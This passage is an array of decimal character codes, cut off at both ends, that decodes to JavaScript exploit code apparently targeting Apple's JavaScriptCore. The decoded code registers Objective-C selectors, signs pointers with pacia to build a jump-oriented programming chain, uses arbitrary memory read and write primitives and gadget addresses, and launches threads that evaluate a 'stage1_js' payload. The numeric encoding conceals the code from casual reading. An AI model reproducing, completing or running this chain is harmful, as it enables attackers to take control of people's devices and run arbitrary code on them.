61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 107, 101, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 110, 118, 111, 107, 101, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 108, 101, 97, 115, 101, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 101, 108, 101, 97, 115, 101, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 58, 97, 116, 73, 110, 100, 101, 120, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 116, 97, 114, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 115, 116, 97, 114, 116, 34, 41, 41, 59, 10, 10, 108, 101, 116, 32, 105, 110, 118, 111, 107, 101, 95, 99, 108, 97, 115, 115, 32, 32, 32, 61, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 34, 78, 83, 73, 110, 118, 111, 99, 97, 116, 105, 111, 110, 34, 41, 59, 10, 108, 101, 116, 32, 106, 115, 99, 95, 99, 108, 97, 115, 115, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 34, 74, 83, 67, 111, 110, 116, 101, 120, 116, 34, 41, 59, 10, 108, 101, 116, 32, 110, 115, 116, 104, 114, 101, 97, 100, 95, 99, 108, 97, 115, 115, 32, 61, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 34, 78, 83, 84, 104, 114, 101, 97, 100, 34, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 99, 115, 116, 114, 105, 110, 103, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 40, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 44, 32, 99, 115, 116, 114, 105, 110, 103, 44, 32, 107, 67, 70, 83, 116, 114, 105, 110, 103, 69, 110, 99, 111, 100, 105, 110, 103, 85, 84, 70, 56, 41, 59, 10, 125, 10, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 98, 111, 120, 101, 100, 95, 97, 114, 114, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 98, 111, 120, 101, 100, 95, 97, 114, 114, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 105, 115, 78, 97, 78, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 115, 78, 97, 78, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 119, 95, 97, 114, 114, 97, 121, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 34, 41, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 95, 99, 111, 112, 121, 40, 99, 102, 115, 116, 114, 105, 110, 103, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 40, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 44, 32, 99, 102, 115, 116, 114, 105, 110, 103, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 40, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 108, 101, 97, 115, 101, 40, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 108, 101, 97, 115, 101, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 111, 98, 106, 44, 32, 99, 102, 115, 116, 114, 95, 107, 101, 121, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 44, 32, 99, 102, 115, 116, 114, 95, 107, 101, 121, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 40, 111, 98, 106, 44, 32, 106, 115, 99, 114, 105, 112, 116, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 44, 32, 106, 115, 99, 114, 105, 112, 116, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 40, 111, 98, 106, 44, 32, 115, 101, 108, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 44, 32, 115, 101, 108, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 40, 111, 98, 106, 44, 32, 115, 105, 103, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 44, 32, 115, 105, 103, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 111, 98, 106, 44, 32, 97, 114, 103, 44, 32, 105, 100, 120, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 44, 32, 97, 114, 103, 44, 32, 105, 100, 120, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 40, 111, 98, 106, 44, 32, 116, 97, 114, 103, 101, 116, 44, 32, 115, 101, 108, 44, 32, 111, 98, 106, 101, 99, 116, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 44, 32, 116, 97, 114, 103, 101, 116, 44, 32, 115, 101, 108, 44, 32, 111, 98, 106, 101, 99, 116, 41, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 110, 115, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 40, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 116, 97, 114, 116, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 116, 117, 112, 95, 102, 99, 97, 108, 108, 95, 106, 111, 112, 99, 104, 97, 105, 110, 40, 41, 32, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 32, 61, 32, 109, 97, 108, 108, 111, 99, 40, 80, 65, 71, 69, 95, 83, 73, 90, 69, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 61, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 49, 48, 48, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 32, 61, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 50, 48, 48, 110, 59, 10, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 48, 110, 44, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 56, 110, 44, 32, 112, 97, 99, 105, 97, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 44, 32, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 95, 67, 70, 79, 98, 106, 101, 99, 116, 67, 111, 112, 121, 80, 114, 111, 112, 101, 114, 116, 121, 44, 32, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 43, 32, 48, 120, 52, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 106, 115, 118, 109, 95, 105, 115, 78, 65, 78, 95, 102, 99, 97, 108, 108, 95, 103, 97, 100, 103, 101, 116, 50, 44, 32, 48, 110, 41, 41, 59, 10, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 50, 48, 110, 44, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 52, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 50, 56, 110, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 45, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 51, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 48, 120, 52, 49, 52, 49, 52, 49, 52, 49, 110, 44, 32, 48, 120, 67, 50, 68, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 53, 48, 110, 44, 32, 112, 97, 99, 105, 97, 40, 102, 99, 97, 108, 108, 95, 49, 52, 95, 97, 114, 103, 115, 95, 119, 114, 105, 116, 101, 95, 120, 56, 44, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 53, 48, 110, 41, 41, 59, 10, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 34, 32, 58, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 34, 32, 58, 32, 108, 111, 97, 100, 95, 120, 49, 120, 51, 120, 56, 95, 97, 114, 103, 115, 32, 43, 32, 48, 120, 51, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 34, 32, 58, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 44, 10, 32, 32, 32, 32, 125, 59, 10, 125, 10, 10, 108, 101, 116, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 32, 61, 32, 48, 110, 59, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 95, 115, 112, 97, 119, 110, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 32, 61, 32, 48, 120, 48, 110, 41, 10, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 116, 121, 112, 101, 111, 102, 32, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 32, 61, 61, 61, 32, 34, 115, 116, 114, 105, 110, 103, 34, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 41, 59, 10, 32, 32, 32, 32, 125, 32, 101, 108, 115, 101, 32, 105, 102, 32, 40, 116, 121, 112, 101, 111, 102, 32, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 32, 61, 61, 61, 32, 34, 111, 98, 106, 101, 99, 116, 34, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 117, 114, 101, 97, 100, 54, 52, 40, 97, 100, 100, 114, 111, 102, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 32, 43, 32, 48, 120, 49, 48, 110, 41, 41, 59, 10, 32, 32, 32, 32, 125, 32, 101, 108, 115, 101, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 47, 47, 32, 105, 110, 32, 116, 104, 105, 115, 32, 99, 97, 115, 101, 44, 32, 105, 116, 39, 115, 32, 97, 108, 114, 101, 97, 100, 121, 32, 97, 32, 67, 70, 83, 116, 114, 105, 110, 103, 44, 32, 115, 111, 32, 108, 101, 116, 39, 115, 32, 106, 117, 115, 116, 32, 99, 111, 112, 121, 32, 105, 116, 10, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 95, 99, 111, 112, 121, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 32, 61, 32, 115, 101, 116, 117, 112, 95, 102, 99, 97, 108, 108, 95, 106, 111, 112, 99, 104, 97, 105, 110, 40, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 32, 61, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 32, 32, 32, 61, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 32, 61, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 34, 93, 59, 10, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 116, 120, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 95, 105, 110, 105, 116, 40, 106, 115, 99, 95, 99, 108, 97, 115, 115, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 118, 97, 108, 117, 101, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 105, 115, 78, 97, 78, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 102, 117, 110, 99, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 105, 115, 110, 97, 110, 95, 118, 97, 108, 117, 101, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 97, 100, 100, 114, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 105, 115, 110, 97, 110, 95, 102, 117, 110, 99, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 110, 97, 110, 95, 99, 111, 100, 101, 95, 112, 116, 114, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 105, 115, 110, 97, 110, 95, 101, 120, 101, 99, 117, 116, 97, 98, 108, 101, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 50, 56, 110, 59, 10, 32, 32, 32, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 115, 116, 97, 103, 101, 49, 95, 106, 115, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 115, 101, 116, 117, 112, 32, 97, 100, 100, 114, 111, 102, 32, 112, 114, 105, 109, 115, 10, 32, 32, 32, 32, 108, 101, 116, 32, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 95, 118, 97, 108, 117, 101, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 117, 110, 98, 111, 120, 101, 100, 